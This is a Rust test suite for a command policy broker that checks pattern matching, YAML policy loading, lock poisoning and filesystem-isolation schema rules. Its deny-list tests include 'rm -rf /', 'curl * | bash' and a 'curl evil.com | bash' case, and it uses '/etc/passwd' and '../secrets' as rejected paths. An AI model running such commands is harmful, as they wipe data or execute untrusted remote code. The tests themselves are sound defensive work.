use super::*;
use std::sync::{Arc, Barrier, RwLock};
use substrate_common::WorldFsMode;
use tempfile::tempdir;

fn poison_rwlock<T: Send + Sync + 'static>(lock: &Arc<RwLock<T>>) {
    let cloned = Arc::clone(lock);
    let _ = std::thread::spawn(move || {
        let _guard = cloned.write().unwrap();
        panic!("poison lock");
    })
    .join();
}

#[test]
fn test_broker_creation() {
    let broker = Broker::new();
    assert!(broker.is_observe_only());
}

#[test]
fn test_pattern_matching() {
    assert!(matches_pattern(
        "curl http://example.com | bash",
        "curl * | bash"
    ));
    assert!(matches_pattern("npm install", "npm install"));
    assert!(!matches_pattern("cargo build", "npm install"));
    assert!(matches_pattern("git clone repo", "git clone"));
}

#[test]
fn test_quick_check_allow() {
    let broker = Broker::new();
    let result = broker
        .quick_check(&["echo".into(), "hello".into()], "/tmp")
        .unwrap();
    assert!(matches!(result, Decision::Allow));
}

#[test]
fn test_load_policy() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    let broker = Broker::new();

    let policy_content = r#"
id: test-policy
name: Test Policy
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed:
  - github.com
cmd_allowed:
  - echo *
  - ls *
cmd_denied:
  - rm -rf /
  - curl * | bash
cmd_isolated:
  - npm install
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#;
    std::fs::write(&policy_path, policy_content).unwrap();

    broker.load_policy(&policy_path).expect("load policy");

    let policy = broker.policy.read().unwrap();
    assert_eq!(policy.world_fs_mode, WorldFsMode::Writable);

    // Test that denied command is blocked (in enforce mode)
    broker.set_observe_only(false);
    let result = broker
        .quick_check(
            &["curl".into(), "evil.com".into(), "|".into(), "bash".into()],
            "/tmp",
        )
        .unwrap();
    assert!(matches!(result, Decision::Deny(_)));
}

#[test]
fn minimal_policy_parses_with_required_world_fs() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    std::fs::write(
        &policy_path,
        r#"
world_fs:
  host_visible: true
  write:
    enabled: false
  fail_closed:
    routing: true
cmd_denied:
  - ls
"#,
    )
    .unwrap();

    let policy = crate::effective_policy::load_policy_from_path(&policy_path)
        .expect("policy patch should load");

    assert_eq!(policy.world_fs_mode, WorldFsMode::ReadOnly);
    assert_eq!(policy.world_fs_isolation, WorldFsIsolation::Workspace);
    assert!(policy.world_fs_require_world);
}

#[test]
fn poisoned_policy_lock_returns_error_in_evaluate() {
    let broker = Broker::new();
    poison_rwlock(&broker.policy);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo ok", "/tmp", None));
    assert!(result.is_ok(), "broker.evaluate panicked on poisoned lock");

    let err = result
        .unwrap()
        .expect_err("expected poisoned lock to return error");
    assert!(
        err.to_string()
            .contains("Failed to acquire policy read lock"),
        "unexpected error: {err}"
    );

    broker.policy.clear_poison();
}

#[test]
fn poisoned_approvals_lock_returns_error() {
    let broker = Broker::new();
    {
        let mut policy = broker.policy.write().unwrap();
        policy.require_approval = true;
    }
    broker.set_observe_only(false);
    poison_rwlock(&broker.approvals);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo guarded", "/tmp", None));
    assert!(
        result.is_ok(),
        "broker.evaluate panicked with poisoned approvals"
    );

    let err = result
        .unwrap()
        .expect_err("expected approval read failure to return error");
    assert!(
        err.to_string().contains("approvals read lock"),
        "unexpected error: {err}"
    );

    broker.approvals.clear_poison();
}

#[test]
fn broker_handles_remain_isolated_in_parallel() {
    let dir = tempdir().unwrap();
    let policy_a = dir.path().join("policy_a.yaml");
    let policy_b = dir.path().join("policy_b.yaml");

    std::fs::write(
        &policy_a,
        r#"
id: alpha
name: Alpha Policy
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed: []
cmd_allowed:
  - alpha-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    std::fs::write(
        &policy_b,
        r#"
id: beta
name: Beta Policy
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed: []
cmd_allowed:
  - beta-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    let broker_a = BrokerHandle::new();
    broker_a.initialize(Some(&policy_a)).unwrap();
    broker_a.set_observe_only(false);

    let broker_b = BrokerHandle::new();
    broker_b.initialize(Some(&policy_b)).unwrap();

    assert!(
        broker_b.is_observe_only(),
        "changing one broker handle should not affect another"
    );
    broker_b.set_observe_only(false);

    let barrier = Arc::new(Barrier::new(2));
    let thread_a = {
        let barrier = barrier.clone();
        let broker = broker_a.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("alpha-allowed", "/tmp", None)
        })
    };

    let thread_b = {
        let barrier = barrier.clone();
        let broker = broker_b.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("beta-allowed", "/tmp", None)
        })
    };

    let decision_a = thread_a.join().expect("thread a panicked").unwrap();
    let decision_b = thread_b.join().expect("thread b panicked").unwrap();

    assert!(matches!(decision_a, Decision::Allow));
    assert!(matches!(decision_b, Decision::Allow));

    assert!(matches!(
        broker_a
            .evaluate("beta-allowed", "/tmp", None)
            .expect("evaluate beta on broker_a"),
        Decision::Deny(_)
    ));
    assert!(matches!(
        broker_b
            .evaluate("alpha-allowed", "/tmp", None)
            .expect("evaluate alpha on broker_b"),
        Decision::Deny(_)
    ));
}

#[test]
fn invalid_world_fs_mode_in_policy_surfaces_error() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    std::fs::write(
        &policy_path,
        r#"
id: bad-fs-mode
name: Invalid fs mode
world_fs:
  mode: invalid
net_allowed: []
cmd_allowed: []
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    let broker = Broker::new();
    let result = broker.load_policy(&policy_path);
    assert!(
        result.is_err(),
        "expected invalid world_fs.mode to fail parsing"
    );
}

mod wfgad0_policy_schema_v2 {
    use super::*;

    fn load_policy_from_yaml(raw: &str) -> anyhow::Result<Policy> {
        let dir = tempdir().expect("tempdir");
        let policy_path = dir.path().join("policy.yaml");
        std::fs::write(&policy_path, raw).expect("write policy.yaml");
        crate::effective_policy::load_policy_from_path(&policy_path)
    }

    fn expect_err(raw: &str) -> String {
        load_policy_from_yaml(raw)
            .expect_err("expected policy patch to be rejected")
            .to_string()
    }

    fn expect_err_contains(raw: &str, needle: &str) {
        let err = expect_err(raw);
        assert!(
            err.contains(needle),
            "expected error to contain {needle:?}, got: {err}"
        );
    }

    #[test]
    fn rejects_legacy_world_fs_allowlist_keys() {
        // R-001: breaking schema; legacy keys must hard error.
        expect_err_contains(
            r#"
world_fs:
  read_allowlist: ["*"]
  write_allowlist: []
"#,
            "read_allowlist",
        );
    }

    #[test]
    fn rejects_legacy_isolation_project_value() {
        // R-001: breaking schema; legacy values must hard error (only workspace|full allowed).
        expect_err_contains(
            r#"
world_fs:
  isolation: project
"#,
            "isolation",
        );
    }

    #[test]
    fn denies_and_enforcement_are_rejected_in_workspace_isolation() {
        // SCHEMA.md §1.5.2: full-isolation-only keys must be omitted when host_visible=true.
        let err = expect_err(
            r#"
world_fs:
  host_visible: true
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#,
        );
        assert!(
            err.contains("host_visible") || err.contains("read"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn allow_list_must_be_present_and_non_empty() {
        // SCHEMA.md §1.4 + §1.5.3: allow_list must be non-empty after defaulting.
        // Empty lists should be defaulted deterministically in full isolation.
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: []
    deny_list: []
"#,
        );
        let policy = policy.expect("expected empty allow_list to be defaulted in full isolation");
        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be present in full isolation");
        assert_eq!(read.allow_list, vec![".".to_string()]);
    }

    #[test]
    fn allow_list_rejects_glob_metacharacters() {
        // R-004: allow_list must not contain glob metacharacters (* ? [ ]).
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["src/**"]
    deny_list: []
"#,
        );
    }

    #[test]
    fn deny_list_rejects_unsupported_glob_metacharacters() {
        // R-004: deny_list supports only * and ** wildcards; ? and [...] must hard error.
        expect_err(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["file?.txt"]
"#,
        );
        expect_err(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["file[0-9].txt"]
"#,
        );
    }

    #[test]
    fn patterns_must_be_project_root_relative() {
        // R-004: absolute paths and any ".." segment must hard error.
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["/etc/passwd"]
    deny_list: []
"#,
        );
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["../secrets"]
    deny_list: []
"#,
        );
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["a/../b"]
    deny_list: []
"#,
        );
    }

    #[test]
    fn enforcement_must_be_present_iff_any_deny_list_is_non_empty() {
        // SCHEMA.md §1.5.4: deny_enforcement is required when any deny_list is non-empty.
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#,
        );

        // deny_enforcement MAY be present even when all deny_list values are empty.
        load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: []
"#,
        )
        .expect("expected deny_enforcement to be allowed with empty denies");
    }

    #[test]
    fn accepts_normalized_literals_and_wildcard_denies_in_full_isolation() {
        // R-004: leading "./" and trailing "/" are normalized (accepted) and semantics are deterministic.
        // Also validates that a minimal full-isolation deny configuration is accepted when consistent.
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: weak
  read:
    allow_list: ["./src/"]
    deny_list: ["./secrets/", "**/*.pem"]
"#,
        )
        .expect("expected a valid v3 full isolation deny configuration to load");
        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be present");
        assert_eq!(read.allow_list, vec!["src".to_string()]);
        assert_eq!(
            read.deny_list,
            vec!["secrets".to_string(), "**/*.pem".to_string()]
        );
    }

    #[test]
    fn writable_full_isolation_defaults_read_allow_list_from_write_when_missing() {
        // SCHEMA.md §1.4: read.allow_list defaults to ["."], independent of write.allow_list.
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  write:
    allow_list: ["./outputs/private/"]
"#,
        )
        .expect("expected writable full isolation policy to load");

        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be present in full isolation");
        assert_eq!(read.allow_list, vec![".".to_string()]);

        let write = policy
            .world_fs_write
            .as_ref()
            .expect("write dimension should be present when write.enabled=true");
        assert_eq!(write.allow_list, vec!["outputs/private".to_string()]);
    }
}

mod wfgadax0_policy_schema_v3 {
    use super::*;

    fn load_policy_from_yaml(raw: &str) -> anyhow::Result<Policy> {
        let dir = tempdir().expect("tempdir");
        let policy_path = dir.path().join("policy.yaml");
        std::fs::write(&policy_path, raw).expect("write policy.yaml");
        crate::effective_policy::load_policy_from_path(&policy_path)
    }

    fn expect_err(raw: &str) -> String {
        load_policy_from_yaml(raw)
            .expect_err("expected policy patch to be rejected")
            .to_string()
    }

    fn expect_err_contains(raw: &str, needle: &str) {
        let err = expect_err(raw);
        assert!(
            err.contains(needle),
            "expected error to contain {needle:?}, got: {err}"
        );
    }

    #[test]
    fn wfgadax0_rejects_replaced_world_fs_keys_mode_isolation_require_world_enforcement() {
        // SCHEMA.md §1.2: Appendix A schema is breaking; replaced keys MUST hard error (exit 2).
        //
        // This test uses a previously-valid V2 config; under V3 it must be rejected deterministically.
        let raw = r#"
world_fs:
  mode: read_only
  isolation: full
  require_world: true
  enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#;
        let err = expect_err(raw);
        assert!(
            err.contains("world_fs.mode")
                || err.contains("world_fs.isolation")
                || err.contains("world_fs.require_world")
                || err.contains("world_fs.enforcement")
                || err.contains("mode")
                || err.contains("isolation")
                || err.contains("require_world")
                || err.contains("enforcement"),
            "expected a replaced-key diagnostic, got: {err}"
        );
    }

    #[test]
    fn wfgadax0_accepts_host_visible_true_with_no_full_isolation_dimensions() {
        // SCHEMA.md §1.4: host_visible defaults true; §1.5.2: full-isolation-only keys must be omitted.
        load_policy_from_yaml(
            r#"
world_fs:
  host_visible: true
"#,
        )
        .expect("expected minimal host_visible=true policy patch to load");
    }

    #[test]
    fn wfgadax0_defaults_full_isolation_dimensions_deterministically_when_host_visible_false() {
        // SCHEMA.md §1.4 defaults:
        // - host_visible=false => full isolation
        // - read.allow_list defaults to ["."]
        // - write.enabled defaults true and write.allow_list defaults to ["."]
        // - deny_list defaults to []
        // - discover defaults to read when omitted
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
"#,
        )
        .expect("expected minimal host_visible=false policy patch to load");

        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be defaulted in full isolation");
        assert_eq!(read.allow_list, vec![".".to_string()]);
        assert!(read.deny_list.is_empty());

        let discover = policy
            .world_fs_discover
            .as_ref()
            .expect("discover dimension should default to read in full isolation");
        assert_eq!(discover.allow_list, vec![".".to_string()]);
        assert!(discover.deny_list.is_empty());

        let write = policy
            .world_fs_write
            .as_ref()
            .expect("write dimension should be present by default when write.enabled=true");
        assert_eq!(write.allow_list, vec![".".to_string()]);
        assert!(write.deny_list.is_empty());
    }

    #[test]
    fn wfgadax0_rejects_full_isolation_keys_when_host_visible_true() {
        // SCHEMA.md §1.5.2: If host_visible=true, read/discover/write.allow_list/deny_list MUST be omitted.
        // Assert a deterministic diagnostic that mentions both host_visible and the offending key.
        expect_err_contains(
            r#"
world_fs:
  host_visible: true
  read:
    allow_list: ["."]
"#,
            "host_visible",
        );
        expect_err_contains(
            r#"
world_fs:
  host_visible: true
  read:
    allow_list: ["."]
"#,
            "read",
        );
    }

    #[test]
    fn wfgadax0_requires_deny_enforcement_when_any_deny_list_is_non_empty() {
        // SCHEMA.md §1.5.4: deny_enforcement MUST be present iff any deny_list is non-empty.
        let err = expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#,
        );
        assert!(
            err.contains("deny_enforcement"),
            "expected deny_enforcement diagnostic, got: {err}"
        );
    }

    #[test]
    fn wfgadax0_write_disabled_requires_fail_closed_routing_true() {
        // SCHEMA.md §1.5.1: If write.enabled=false, fail_closed.routing MUST be true.
        let err = expect_err(
            r#"
world_fs:
  host_visible: false
  write:
    enabled: false
  fail_closed:
    routing: false
"#,
        );
        assert!(
            err.contains("write") && err.contains("fail_closed"),
            "expected write.enabled/fail_closed.routing diagnostic, got: {err}"
        );
    }
}

mod c0_policy_patch_only_broker_effective_resolution {
    use serial_test::serial;
    use std::ffi::OsString;
    use std::path::{Path, PathBuf};
    use std::process::Command;
    use std::sync::MutexGuard;
    use std::sync::OnceLock;
    use tempfile::{Builder, TempDir};

    struct EnvVarGuard {
        _lock: MutexGuard<'static, ()>,
        key: &'static str,
        prev: Option<OsString>,
    }

    impl EnvVarGuard {
        fn set(key: &'static str, value: impl AsRef<Path>) -> Self {
            let lock = crate::test_utils::env_lock()
                .lock()
                .unwrap_or_else(|err| err.into_inner());
            let prev = std::env::var_os(key);
            std::env::set_var(key, value.as_ref());
            Self {
                _lock: lock,
                key,
                prev,
            }
        }
    }

    impl Drop for EnvVarGuard {
        fn drop(&mut self) {
            match &self.prev {
                Some(prev) => std::env::set_var(self.key, prev),
                None => std::env::remove_var(self.key),
            }
        }
    }

    fn ensure_substrate_built() {
        static BUILD_ONCE: OnceLock<()> = OnceLock::new();
        BUILD_ONCE.get_or_init(|| {
            let target_dir = c0_target_dir();
            let cargo_root = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
            let status = Command::new("cargo")
                .args(["build", "-p", "substrate"])
                .current_dir(&cargo_root)
                .env("CARGO_TARGET_DIR", &target_dir)
                .status()
                .expect("failed to invoke cargo build -p substrate");
            assert!(status.success(), "cargo build -p substrate failed");
        });
    }

    fn c0_target_dir() -> PathBuf {
        let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../target/tests-tmp/c0-policy-patch-only-cargo-target");
        std::fs::create_dir_all(&base).expect("failed to create C0 cargo target dir");
        base
    }

    fn substrate_binary_path() -> PathBuf {
        let binary_name = if cfg!(windows) {
            "substrate.exe"
        } else {
            "substrate"
        };

        c0_target_dir().join("debug").join(binary_name)
    }

    fn substrate_cmd(tmpdir: &Path) -> Command {
        ensure_substrate_built();

        let mut cmd = Command::new(substrate_binary_path());
        cmd.env("TMPDIR", tmpdir);
        cmd.env_remove("SHIM_ORIGINAL_PATH");
        cmd.env_remove("SUBSTRATE_WORLD");
        cmd.env_remove("SUBSTRATE_WORLD_ENABLED");
        cmd.env("SUBSTRATE_OVERRIDE_WORLD", "disabled");
        cmd.env_remove("SUBSTRATE_WORLD_ID");
        cmd
    }

    fn temp_dir(prefix: &str) -> TempDir {
        let base = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../target/tests-tmp");
        std::fs::create_dir_all(&base).expect("failed to create shared TMPDIR");
        Builder::new()
            .prefix(prefix)
            .tempdir_in(base)
            .expect("failed to allocate integration test temp dir")
    }

    struct Fixture {
        _temp: TempDir,
        home: PathBuf,
        substrate_home: PathBuf,
        workspace_root: PathBuf,
    }

    impl Fixture {
        fn new() -> Self {
            let temp = temp_dir("c0-policy-patch-only-");
            let home = temp.path().join("home");
            std::fs::create_dir_all(&home).expect("create HOME fixture");
            let substrate_home = temp.path().join("substrate-home");
            std::fs::create_dir_all(&substrate_home).expect("create SUBSTRATE_HOME fixture");
            let workspace_root = temp.path().join("workspace");
            std::fs::create_dir_all(&workspace_root).expect("create workspace root");

            std::fs::create_dir_all(workspace_root.join(".substrate"))
                .expect("create .substrate dir");

            Self {
                _temp: temp,
                home,
                substrate_home,
                workspace_root,
            }
        }

        fn workspace_marker_path(&self) -> PathBuf {
            self.workspace_root
                .join(".substrate")
                .join("workspace.yaml")
        }

        fn workspace_disabled_marker_path(&self) -> PathBuf {
            self.workspace_root
                .join(".substrate")
                .join("workspace.disabled")
        }

        fn workspace_policy_path(&self) -> PathBuf {
            self.workspace_root.join(".substrate").join("policy.yaml")
        }

        fn global_policy_path(&self) -> PathBuf {
            self.substrate_home.join("policy.yaml")
        }

        fn child_dir(&self) -> PathBuf {
            let child = self.workspace_root.join("a/b");
            std::fs::create_dir_all(&child).expect("create child dir");
            child
        }

        fn write_workspace_marker(&self) {
            std::fs::write(self.workspace_marker_path(), "schema_version: 1\n")
                .expect("write workspace.yaml marker");
        }

        fn write_workspace_disabled(&self) {
            std::fs::write(self.workspace_disabled_marker_path(), "")
                .expect("write workspace.disabled marker");
        }

        fn write_global_policy(&self, yaml: &str) {
            std::fs::write(self.global_policy_path(), yaml).expect("write global policy.yaml");
        }

        fn write_workspace_policy(&self, yaml: &str) {
            std::fs::write(self.workspace_policy_path(), yaml)
                .expect("write workspace policy.yaml");
        }

        fn run_substrate(&self, cwd: &Path, args: &[&str]) -> std::process::Output {
            let mut cmd = substrate_cmd(self._temp.path());
            cmd.current_dir(cwd);
            cmd.env("HOME", &self.home);
            cmd.env("USERPROFILE", &self.home);
            cmd.env("SUBSTRATE_HOME", &self.substrate_home);
            cmd.args(args);
            cmd.output().expect("run substrate command")
        }
    }

    fn full_policy_yaml_with_cmd_allowed(policy_id: &str, cmd_allowed: &[&str]) -> String {
        let cmd_allowed_yaml = cmd_allowed
            .iter()
            .map(|s| format!("  - {s}\n"))
            .collect::<String>();
        format!(
            r#"id: "{policy_id}"
name: "{policy_id}"
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed: []
cmd_allowed:
{cmd_allowed_yaml}cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {{}}
"#
        )
    }

    #[test]
    #[serial]
    fn c0_invalid_world_fs_schema_exits_2() {
        // R-016: "Hard error" for invalid policy/config is exit code 2 on the host CLI.
        // R-001: legacy keys must hard error (breaking schema v2).
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
  write_allowlist: []
"#,
        );

        let cwd = fixture.child_dir();
        let output = fixture.run_substrate(&cwd, &["policy", "current", "show", "--json"]);
        assert_eq!(
            output.status.code(),
            Some(2),
            "expected invalid policy schema to exit 2, got: {output:?}"
        );
    }

    #[test]
    #[serial]
    fn c0_cli_policy_current_show_explain_emits_single_json_object_on_stderr() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        let cwd = fixture.child_dir();
        let output =
            fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
        assert!(
            output.status.success(),
            "expected `substrate policy current show --explain` to succeed: {output:?}"
        );

        let stderr = String::from_utf8_lossy(&output.stderr);
        let explain: serde_json::Value =
            serde_json::from_slice(&output.stderr).unwrap_or_else(|err| {
                panic!(
                    "expected stderr to be a single JSON object (no extra note lines); parse error: {err}; stderr was: {stderr}"
                )
            });
        assert_eq!(
            explain.get("kind").and_then(|v| v.as_str()),
            Some("substrate.policy.explain.v1"),
            "unexpected explain kind: {explain}"
        );
    }

    #[test]
    #[serial]
    fn c0_broker_merges_sparse_global_and_workspace_patches() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
cmd_allowed:
  - global-allowed
"#,
        );
        fixture.write_workspace_policy(
            r#"
metadata:
  workspace: "true"
"#,
        );

        let cwd = fixture.child_dir();
        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve effective policy via patch merge");

        assert_eq!(policy.cmd_allowed, vec!["global-allowed".to_string()]);
        assert_eq!(
            policy.metadata.get("workspace").map(String::as_str),
            Some("true")
        );
    }

    #[test]
    #[serial]
    fn c0_broker_workspace_disabled_ignores_workspace_patch() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        fixture.write_workspace_disabled();

        fixture.write_global_policy(&full_policy_yaml_with_cmd_allowed(
            "global",
            &["global-allowed"],
        ));
        fixture.write_workspace_policy(&full_policy_yaml_with_cmd_allowed(
            "workspace",
            &["workspace-allowed"],
        ));

        let cwd = fixture.child_dir();
        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve policy for cwd");

        assert_eq!(
            policy.cmd_allowed,
            vec!["global-allowed".to_string()],
            "workspace.disabled should prevent workspace policy from affecting broker effective policy"
        );
    }

    #[test]
    #[serial]
    fn c0_effective_policy_is_identical_across_broker_and_cli_show_and_explain() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
cmd_allowed:
  - global-allowed
"#,
        );
        fixture.write_workspace_policy(
            r#"
metadata:
  workspace: "true"
"#,
        );

        let cwd = fixture.child_dir();

        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (broker_policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve effective policy via patch merge");
        let mut broker_json =
            serde_json::to_value(&broker_policy).expect("serialize broker policy");
        if let Some(require_world) = broker_json
            .get("world_fs")
            .and_then(|fs| fs.get("require_world"))
            .and_then(|v| v.as_bool())
        {
            broker_json["world_fs_require_world"] = serde_json::Value::Bool(require_world);
        }

        let show = fixture.run_substrate(&cwd, &["policy", "current", "show", "--json"]);
        assert!(
            show.status.success(),
            "expected `substrate policy current show` to succeed: {show:?}"
        );
        assert!(
            String::from_utf8_lossy(&show.stderr).contains("effective merged policy"),
            "expected merged-policy note on stderr, got: {}",
            String::from_utf8_lossy(&show.stderr)
        );
        let cli_show_json: serde_json::Value =
            serde_json::from_slice(&show.stdout).expect("policy show should output JSON");

        let explain =
            fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
        assert!(
            explain.status.success(),
            "expected `substrate policy current show --explain` to succeed: {explain:?}"
        );
        let cli_explain_json: serde_json::Value = serde_json::from_slice(&explain.stdout)
            .expect("policy show --explain should output JSON");

        assert_eq!(
            cli_show_json, cli_explain_json,
            "stdout policy must match with/without --explain"
        );
        assert_eq!(
            cli_show_json, broker_json,
            "effective policy must match across broker and CLI"
        );
    }
}
